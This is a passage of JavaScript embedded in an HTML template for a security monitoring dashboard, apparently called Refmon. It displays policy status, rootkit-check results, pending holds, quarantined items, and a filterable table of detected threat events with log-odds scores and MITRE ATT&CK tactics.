      `Workspace: ${st.sandbox_dir}  |  Policy: ${st.policy_path}`;
    document.getElementById('m-sig').textContent = st.policy.signature_ok ? 'VERIFIED' : 'UNSIGNED';
    document.getElementById('m-mode').textContent = st.policy.mode.toUpperCase();
    document.getElementById('m-eval').textContent =
      st.counts.evaluated ? `${st.counts.eval_passed}/${st.counts.evaluated} PASS` : '—';
    document.getElementById('m-events').textContent = st.counts.events;
    document.getElementById('m-blocked').textContent = st.counts.blocked;
    document.getElementById('m-holds').textContent = st.counts.pending_holds;
    document.getElementById('m-quar').textContent = st.quarantined.length;
    document.getElementById('m-rk').textContent = st.rootkit.calculus_decision.toUpperCase();

    for (const m of ['block', 'warn', 'observe']) {
      const btn = document.getElementById('btn-mode-' + m);
      if (btn) btn.className = (st.policy.mode === m) ? 'active-mode' : '';
    }
    for (const f of ['all', 'attack', 'hold', 'benign']) {
      const fb = document.getElementById('flt-' + f);
      if (fb) fb.className = (currentFilter === f) ? 'btn-sm active-mode' : 'btn-sm';
    }

    document.getElementById('policy-kv').innerHTML = `
      <div class="kv-row"><span>Ed25519 Digest</span><span class="mono">${esc(st.policy.digest.slice(0, 20))}...</span></div>
      <div class="kv-row"><span>Prior / Hold / Block (nats)</span><span class="mono">${st.policy.prior_lo} / ${st.policy.hold_thr} / ${st.policy.block_thr}</span></div>
      <div class="kv-row"><span>Canaries</span><span class="mono">${esc(st.policy.canaries.join(', '))}</span></div>
    `;

    const rk = st.rootkit;
    document.getElementById('rk-summary').innerHTML =
      `Decision: <strong>${esc(rk.calculus_decision).toUpperCase()}</strong> | `
      + `L=${rk.log_odds} nats | findings=${rk.findings.length} | `
      + `modules=${rk.kernel_modules_checked}, procs=${rk.own_processes_inspected}`;

    const hl = st.health;
    const hb = document.getElementById('health-box');
    if (hl) {
      const stt = hl.selftest;
      const stLine = stt
        ? `self-test ${stt.passed} passed, ${stt.failed.length ? 'FAILED: ' + stt.failed.join(', ') : 'none failed'} (${stt.ts})`
        : 'self-test pending';
      const probs = hl.problems.map(p =>
        `<div style="color:${p.severity === 'critical' ? 'var(--danger, #c33)' : 'inherit'}">[${esc(p.severity)}] ${esc(p.title)}: ${esc(p.subject)}</div>`
      ).join('');
      const recent = hl.notifications.recent.slice(-5).reverse().map(n =>
        `<div>${esc(n.ts.slice(11, 19))} ${esc(n.severity)} ${esc(n.title)}</div>`
      ).join('');
      hb.innerHTML = `<div>heartbeat ${esc(hl.last_heartbeat || '-')} (#${hl.beats}) | ${esc(stLine)}</div>`
        + (probs || '<div>no problems</div>')
        + `<div style="margin-top:3px;">notifications: ${hl.notifications.sent} sent, ${hl.notifications.failed} failed; ${esc(hl.notifications.channels)}</div>`
        + recent;
    }

    const hbox = document.getElementById('holds-list');
    if (!st.holds.length) {
      hbox.textContent = 'No pending holds.';
    } else {
      hbox.innerHTML = st.holds.map(h => `
        <div style="margin-top:4px; padding:6px; border:1px solid var(--border); border-radius:6px;">
          <span class="mono"><strong>${esc(h.hold_id)}</strong> (${esc(h.platform)}, ${esc(h.story_id)})</span>
          <div style="margin-top:4px; display:flex; gap:5px;">
            <button class="btn-sm" onclick="resolveHold('${esc(h.hold_id)}','${esc(h.platform)}','${h.platform === 'server' ? 'confirm' : 'stop'}')">Stop &amp; Block</button>
            <button class="btn-sm" onclick="resolveHold('${esc(h.hold_id)}','${esc(h.platform)}','${h.platform === 'server' ? 'release' : 'continue'}')">Release</button>
          </div>
        </div>
      `).join('');
    }

    const qbox = document.getElementById('quar-list');
    qbox.textContent = st.quarantined.length ? st.quarantined.join(', ') : 'Empty';

    // Check for newly arrived attacks/holds to trigger audio & alert card
    if (st.stories && st.stories.length) {
      for (const s of st.stories) {
        if (!seenStoryIds.has(s.story_id)) {
          seenStoryIds.add(s.story_id);
          if (!isInitialLoad && (s.decision === 'block' || s.decision === 'hold')) {
            playAlertSound(s.decision);
            showThreatAlert(s);
            triggerDesktopNotif(`Refmon: ${s.attack_type || 'Threat'} ${s.decision.toUpperCase()}`, s.explanation || 'Threat detected');
          }
        }
      }
    }
    isInitialLoad = false;

    // Filter stories
    const filtered = st.stories.filter(s => {
      if (currentFilter === 'attack') return s.category === 'attack' || s.category === 'malicious' || s.decision === 'block';
      if (currentFilter === 'hold') return s.decision === 'hold' || s.category === 'borderline';
      if (currentFilter === 'benign') return s.category === 'benign' || s.decision === 'allow';
      return true;
    });

    const tbody = document.getElementById('stories-tbody');
    if (!filtered.length) {
      tbody.innerHTML = '<tr><td colspan="6" class="muted">No stories match the current filter.</td></tr>';
    } else {
      tbody.innerHTML = filtered.map(s => {
        const q = s.failed;
        let checkBadge = '<span class="tag neutral">Live Input</span>';
        if (s.analysis_passed === true) {
          checkBadge = `<span class="tag pass">Check: PASS (exp ${esc(s.expected).toUpperCase()})</span>`;
        } else if (s.analysis_passed === false) {
          checkBadge = `<span class="tag fail">Check: MISMATCH (exp ${esc(s.expected).toUpperCase()})</span>`;
        }
        const contribs = (s.contributions || []).map(c => `${c.signal} (${c.nats >= 0 ? '+' : ''}${c.nats})`).join(', ');
        return `
          <tr>
            <td class="mono">
              <strong>${esc(s.story_id)}</strong><br>
              <span class="muted">${esc(s.ts)} UTC</span><br>
              <span class="muted">${esc(s.platform)} · ${s.events} ev</span>
            </td>
            <td>
              <strong>${esc(s.attack_type)}</strong><br>
              <span class="tag neutral" style="margin-top:3px;">${esc(s.category)}</span>
            </td>
            <td>
              <span class="tag ${esc(s.decision)}">${esc(s.decision).toUpperCase()}</span>
              ${s.override ? `<span class="tag block">OVR:${esc(s.override)}</span>` : ''}
              <div style="margin-top:4px;">${checkBadge}</div>
              <div class="muted" style="margin-top:3px;">${esc(s.enforcement)}</div>
            </td>
            <td>
              <div class="q-line">
                <span class="q-chip ${q.origin ? 'qfail' : 'qok'}">Origin: ${q.origin ? 'FAIL' : 'OK'}</span>
                <span class="q-chip ${q.contract ? 'qfail' : 'qok'}">Contract: ${q.contract ? 'FAIL' : 'OK'}</span>
                <span class="q-chip ${q.effect ? 'qfail' : 'qok'}">Effect: ${q.effect ? 'FAIL' : 'OK'}</span>
              </div>
              <div class="muted mono">Failed: ${s.fail_count}/3 · 3/2/1 rule: ${esc(s.rule_decision)}</div>
              ${s.contract_gate ? '<div class="muted mono">Contract gate: active (capped at HOLD)</div>' : ''}
            </td>
            <td class="mono">
              <div><strong>L = ${s.log_odds} nats</strong> <span class="muted">(L0 = ${s.prior_log_odds})</span></div>
              <div class="muted">Threshold crossed: ${esc(s.threshold_crossed)}</div>
              ${contribs ? `<div class="muted" style="margin-top:3px;">${esc(contribs)}</div>` : ''}
            </td>
            <td>
              <div>${esc(s.explanation)}</div>
              <div class="muted mono" style="margin-top:4px;">
                roles=[${esc(s.roles.join(', '))}] · events=[${esc(s.event_types.join(' -> '))}]
                ${s.actions_taken.length ? ` · actions=[${esc(s.actions_taken.join(', '))}]` : ''}
                ${s.tactics.length ? `<br>MITRE ATT&amp;CK: ${esc(s.tactics.join(', '))}` : ''}
                ${s.fingerprints.length ? `<br>HMAC digests: ${esc(s.fingerprints.join(', '))}` : ''}
              </div>
            </td>
          </tr>
        `;
      }).join('');
    }

    document.getElementById('barrier-log').textContent = st.barrier_log.join('\\n') || 'Ready.';
    document.getElementById('events-log').textContent = st.events_log.join('\\n') || 'No events yet.';
    document.getElementById('contracts-box').innerHTML =
      `Protected assets: ${esc(st.policy.protected_assets.join(', '))}<br><br>` +
      Object.entries(st.policy.contracts)
        .map(([r, spec]) => `<div><strong>${esc(r)}</strong>: ${esc(spec)}</div>`)
        .join('');
  } catch (e) {
    // Transient reload error ignored
  }
}

updateSoundButton();
updateNotifButton();
refresh();
setInterval(refresh, 1500);
</script>
</body>
</html>
"""
